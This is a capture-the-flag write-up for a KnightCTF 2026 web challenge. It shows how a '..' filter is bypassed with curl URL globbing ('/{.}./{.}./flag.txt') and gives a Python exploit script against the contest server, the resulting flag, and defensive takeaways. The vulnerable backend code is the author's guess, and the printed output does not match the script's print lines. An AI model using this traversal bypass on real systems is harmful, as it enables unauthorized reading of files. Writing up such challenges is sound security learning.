---
tags:
  - web
  - path_traversal
Date: 2026-01-20
draft: true
---

# WaF CTF Writeup
KnightCTF 2026

## Challenge Overview
- **Challenge Name:** You can't get the `/flag.txt` ever
- **Category:** Web
- **URL:** `http://45.56.66.96:7789/`

## Initial Reconnaissance

Accessing the homepage reveals a simple form:

```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Bee</title>
</head>
<body>
  <p>Input your name:</p>
  <form action="/huraaaaa.html" method="GET">
    <input a="{a}" type="text" required>
    <button type="submit">Submit</button>
  </form>

  <!-- @app.after_request    
    def index(filename: str = "index.html"):
    if ".." in filename or "%" in filename:
        return "No no not like that :("
    
    -->
</body>
</html>
```

### Key Observations

1. **Server:** Werkzeug/2.0.3 Python/3.10.8 (Flask application)
2. **Path Traversal Filter:** The HTML comment reveals the security check:
   ```python
   if ".." in filename or "%" in filename:
       return "No no not like that :("
   ```
3. **Template Engine:** The `{a}` placeholder suggests a custom template engine

### Direct Access Attempts

Attempting to access `/flag.txt` directly returns:
```
Something wrong!!
```

Attempting path traversal with `..` returns:
```
No no not like that :(
```

## Vulnerability Analysis

The server likely uses `curl` to fetch files:

```python
proc = subprocess.run(
    ["curl", f"file://{os.getcwd()}/public/{filename}"],
    capture_output=True,
    timeout=1,
)
```

The filter blocks:
- `..` (path traversal)
- `%` (URL encoding bypass attempts)

## Exploit: Curl URL Globbing

**Curl has a URL globbing feature** that interprets special patterns:
- `{a,b}` - expands to multiple URLs
- `{.}` - expands to just `.`

### The Bypass

Since `{.}.` expands to `..` when processed by curl, but the string `{.}.` does NOT contain the literal `..` substring, it bypasses the filter!

| Input | Filter Check | Curl Interpretation |
|-------|--------------|---------------------|
| `..` | ❌ Blocked | `..` |
| `{.}.` | ✅ Passes | `..` |

### Constructing the Payload

To read `/flag.txt` from the webroot, we need to traverse up from `/public/`:

```
/{.}./{.}./flag.txt
```

This becomes:
```
file:///app/public/../../flag.txt → file:///flag.txt
```

## Exploit Script

```python
import requests

BASE_URL = "http://45.56.66.96:7789"

def exploit():
    # Use curl's URL globbing to bypass ".." filter
    # {.}. expands to ".." when curl processes it
    path = "/{.}./{.}./flag.txt"
    
    print(f"Exploiting: {BASE_URL}{path}")
    r = requests.get(BASE_URL + path, timeout=10)
    print(f"Status: {r.status_code}")
    print(f"Flag: {r.text}")

if __name__ == "__main__":
    exploit()
```

## Result

```
$ python3 exploit_easylfi.py
Testing: http://45.56.66.96:7789/{.}./{.}./flag.txt
Status: 200
Content: KCTF{7fdbbcd6c3cee0ae65c5ca327c14a25f6e473d1c}
```

## Flag
```
KCTF{7fdbbcd6c3cee0ae65c5ca327c14a25f6e473d1c}
```

## Key Takeaways

1. **Curl URL Globbing** is a powerful feature that can bypass naive path traversal filters
2. **Blacklist-based filtering** (checking for `..`) is insufficient when the underlying tool has expansion features
3. **Defense in Depth:** Multiple layers of validation (input sanitization + sandboxing + allowlisting) are needed

## References

- [Curl URL Globbing Documentation](https://curl.se/docs/urlglobbing.html)
